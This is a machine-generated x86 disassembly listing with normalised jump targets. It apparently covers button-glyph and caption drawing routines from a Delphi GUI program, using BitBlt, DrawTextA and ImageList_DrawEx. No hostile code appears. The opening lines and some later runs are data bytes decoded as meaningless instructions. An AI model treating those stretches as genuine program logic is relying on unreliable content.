ror [ ebx - 0x21f9173a ] cl
add [ eax ] eax
push 0x68636143
jl r-xdata
push 0x7473694c
rol [ fs : edx ] 0x1
sub [ edi + 0xc0043 ] ah
pop es
inc edx
jne r-xdata
inc eax
add [ eax ] ah
xor al [ eax ]
add [ edx + esi ] al
test [ edi + 0xe00043 ] cl
add bh bh
loopne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
rol [ edx ] cl
or edx [ edi + eax * 2 + 0x6c ]
add [ esp + esi + 0x34c00040 ] dh
inc eax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
dec [ ebx - 0x31d7f2d ]
je r-xdata
jns r-xdata
add [ ebx ] cl
push esp
inc edi
insb
add [ eax ] dh
add [ eax ] al
add [ eax - 0x4bffbff0 ] ah
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
push eax
aam 0x42
add [ esp + edx * 2 ] cl
inc edx
jne r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 8 + 0x42 ] bh
outsb
jae r-xdata
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ eax - 0x51 ] ch
inc esp
add [ eax - 0x47 ] ch
inc esp
add [ eax - 0x398fffbc ] ch
inc esp
add ah bh
mov [ eax + eax - 0x10 ] 0x61
inc esp
add [ edx ] cl
push esp
inc edi
insb
jns r-xdata
push ebp
jo r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
jbe r-xdata
outsb
inc edi
insb
jns r-xdata
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
cld
add [ ecx + edx * 8 ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 8 ] ah
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x4bffbff0 ] ah
xor al 0x40
add al al
xor al 0x40
insb
shl [ eax + edx * 8 + 0x42 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x42d0
add [ eax ] al
add [ eax ] al
add [ eax ] al
std
mov eax esi
call sub_44b008
test bl bl
jle r-xdata
and dl 0xfc
push 0x5500408d
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_44afb4
add esp 0xfffffff0
call sub_403590
sub_42d18c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_44afb4
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_42d1e0
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b008
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_42d210
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
call sub_413ee0
mov esi eax
mov eax [ ebx + 0x80 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_413e9c
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_44b43c
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_413df8
sub_42d25c
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42d210
mov esi eax
push ebp
mov ecx edi
mov edx esi
mov eax ebx
call sub_44b648
inc [ ebx + 0x84 ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42d288
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_413ec8
test al al
je r-xdata
pop esi
pop ebx
retn
dec [ ebx + 0x84 ]
xor ecx ecx
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_413e9c
sub_42d2b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40323c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_42d2fc
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_42d32c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ esp ]
push eax
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d18c
mov ebx eax
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41386c
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4139c8
mov ebx eax
cmp ebp [ ebx + 0x34 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x30 ]
cmp eax [ esp ]
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42d38c
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ eax + 0x4 ]
call sub_413b0c
mov eax ebx
call sub_40326c
sub_42d3bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_40323c
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov esi eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_42d4f0
mov [ ebx + 0x1c ] 0x8080
mov [ ebx + 0x20 ] 0x1
xor eax eax
add esp 0xfffffff0
call sub_403590
xor edx edx
mov dl al
mov [ ebx + edx * 4 + 0xc ] 0xffffffff
inc eax
cmp al 0x4
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d2b8
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_42d450
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40326c
mov eax esi
call sub_42d4ac
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
mov eax [ rw-data ]
call sub_42d3b0
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
mov eax [ rw-data ]
call sub_40326c
xor eax eax
mov [ rw-data ] eax
sub_42d4ac
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov [ esi + edi * 4 + 0xc ] 0xffffffff
inc ebx
cmp bl 0x4
jne r-xdata
mov edx eax
mov eax [ esi + 0x8 ]
call sub_42d288
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
call sub_42d38c
xor eax eax
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebx
retn
sub_42d4f0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp edx esi
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_421be8
mov [ ebx + 0x1c ] eax
mov eax ebx
call sub_42d4ac
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_42d520
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_42d4ac
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_421be8
mov [ esi + 0x1c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
cmp eax 0x4
jle r-xdata
mov edx eax
mov eax esi
call sub_42d598
mov eax 0x1
sub_42d598
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jbe r-xdata
mov eax esi
call sub_42d4ac
mov [ esi + 0x20 ] bl
mov edx [ esi + 0x4 ]
mov eax esi
call sub_42d4f0
sub_42d5c0
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + eax * 4 + 0xc ]
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x3
jae r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
or esi eax
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov esi eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42db6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push esi
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
xor edx edx
xor eax eax
call sub_412594
mov eax [ ebp - 0xc ]
call sub_421afc
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41ce60
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
call sub_4212c4
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov bl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x20 ]
jl r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x38 ]
push eax
xor ecx ecx
mov cl bl
inc ecx
imul ecx edi
xor eax eax
mov al bl
imul edi
xor edx edx
call sub_412594
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
xor ebx ebx
mov ecx esi
mov edx edi
mov eax [ rw-data ]
call sub_42d32c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d2b8
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_421afc
push eax
mov eax [ ebp - 0xc ]
call sub_421afc
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d0d0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x38 ] 0x1
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx 0x20000000
mov edx [ ebp - 0xc ]
call sub_42d25c
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_42d25c
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42db33
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
jbe r-xdata
dec eax
sub al 0x2
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40326c
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x14 ]
call sub_421afc
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41ce60
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x14 ]
call sub_421bb8
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_421afc
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421afc
mov ecx eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41d0d0
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42286c
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_421afc
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41ce60
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421afc
push eax
mov eax [ ebp - 0x14 ]
call sub_421afc
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d0d0
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000014
call sub_41ce60
mov eax [ ebp - 0x18 ]
call sub_41d628
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_421afc
call sub_41d628
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x10 ]
call sub_421afc
mov eax [ eax + 0x14 ]
mov edx 0x808080
call sub_41ce60
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421afc
push eax
mov eax [ ebp - 0x14 ]
call sub_421afc
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d0d0
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000010
call sub_41ce60
mov eax [ ebp - 0x18 ]
call sub_41d628
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_421afc
call sub_41d628
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_41c1d4
push eax
mov eax [ ebp - 0x10 ]
call sub_421afc
mov eax [ eax + 0x14 ]
pop edx
call sub_41ce60
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421afc
push eax
mov eax [ ebp - 0x14 ]
call sub_421afc
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d0d0
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41ce60
mov eax [ ebp - 0x18 ]
call sub_41d628
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_421afc
call sub_41d628
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42286c
mov eax [ ebp - 0xc ]
call sub_421afc
mov ebx eax
mov eax [ ebx + 0x14 ]
mov edx 0xff00000f
call sub_41ce60
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_41d204
mov eax [ ebx + 0x14 ]
mov edx 0xff000014
call sub_41ce60
push 0x0
mov eax ebx
call sub_41d628
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41d628
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_421afc
call sub_41d628
push eax
push esi
push edi
push 0x1
push 0x1
mov eax ebx
call sub_41d628
push eax
call BitBlt
mov eax [ ebx + 0x14 ]
mov edx 0xff000010
call sub_41ce60
push 0x0
mov eax ebx
call sub_41d628
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41d628
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_421afc
call sub_41d628
push eax
push esi
push edi
push 0x0
push 0x0
mov eax ebx
call sub_41d628
push eax
call BitBlt
mov eax [ ebp - 0x14 ]
call sub_421afc
mov eax [ eax + 0xc ]
mov edx 0xffffff
call sub_41c694
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_42286c
mov eax [ ebp - 0x14 ]
call sub_421afc
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41ce60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40326c
mov eax [ ebp - 0x14 ]
call sub_40326c
retn
sub_42db98
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0xc ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
je r-xdata
mov edx ebx
mov eax edi
call sub_42d5c0
mov esi eax
call sub_42f650
call sub_42f730
test al al
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
xor edx edx
mov dl [ edi + 0x20 ]
mov ecx edx
cdq
idiv ecx
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
dec bl
je r-xdata
push 0x1
push 0x1fffffff
push 0x1fffffff
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d628
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_44b300
push eax
call ImageList_DrawEx
jmp r-xdata
cmp bl 0x3
jne r-xdata
mov bl 0x5
jmp r-xdata
dec ebx
sub bl 0x2
jb r-xdata
push 0x0
push 0x1fffffff
mov eax 0xff00000f
call sub_41c1d4
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d628
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_44b300
push eax
call ImageList_DrawEx
call sub_42f650
lea ecx [ ebp - 0x14 ]
mov edx ebx
call sub_42f994
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi + 0x8 ]
call sub_44b300
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_41d628
push eax
call sub_42f650
lea ecx [ ebp - 0x14 ]
pop edx
call sub_42f880
jmp r-xdata
mov bl 0x4
jmp r-xdata
jmp r-xdata
mov bl 0x2
sub_42dcfc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_41cf7c
cmp [ ebp + 0xc ] 0x1
jne r-xdata
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_40427c
push eax
mov eax esi
call sub_40447c
push eax
mov eax ebx
call sub_41d628
push eax
call DrawTextA
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000014
mov eax [ ebx + 0xc ]
call sub_41c694
mov eax edi
or eax 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_40427c
push eax
mov eax esi
call sub_40447c
push eax
mov eax ebx
call sub_41d628
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ ebx + 0xc ]
call sub_41c694
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_40427c
push eax
mov eax esi
call sub_40447c
push eax
mov eax ebx
call sub_41d628
push eax
call DrawTextA
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_42dddc
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
and eax 0x2
cmp eax 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
lea ecx [ ebp - 0x18 ]
call sub_41256c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_41256c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
lea ecx [ ebp - 0x20 ]
pop edx
call sub_41256c
jmp r-xdata
cmp [ ebp + 0x1c ] 0x1
jne r-xdata
mov [ ebp + 0x1c ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x40 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412594
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_41256c
push 0x0
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
xor edx edx
xor eax eax
call sub_412594
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
or eax 0x400
push eax
push edi
mov eax [ ebp + 0x20 ]
call sub_40427c
push eax
mov eax [ ebp + 0x20 ]
call sub_40447c
push eax
mov eax [ ebp - 0x8 ]
call sub_41d628
push eax
call DrawTextA
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
sub eax [ edi ]
lea ecx [ ebp - 0x28 ]
call sub_41256c
jmp r-xdata
mov eax [ ebp + 0x20 ]
call sub_40427c
test eax eax
jle r-xdata
mov [ ebp + 0x1c ] 0x0
mov eax [ ebp - 0x18 ]
mov edx eax
sub edx [ ebp - 0x20 ]
inc edx
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
sub edx [ ebp - 0x1c ]
inc edx
sar edx 0x1
jns r-xdata
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov [ esi ] edx
sub eax [ ebp - 0x28 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ esi + 0x4 ] edx
sub eax [ ebp - 0x24 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ ebp - 0x10 ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
xor eax eax
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x18 ] 0xffffffff
jne r-xdata
mov al [ ebp + 0x1c ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
pop ecx
sub eax ecx
lea ecx [ ebp - 0x30 ]
call sub_41256c
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp + 0x14 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
add eax [ ebp - 0x28 ]
call sub_41256c
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
call sub_41256c
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi ] eax
add eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
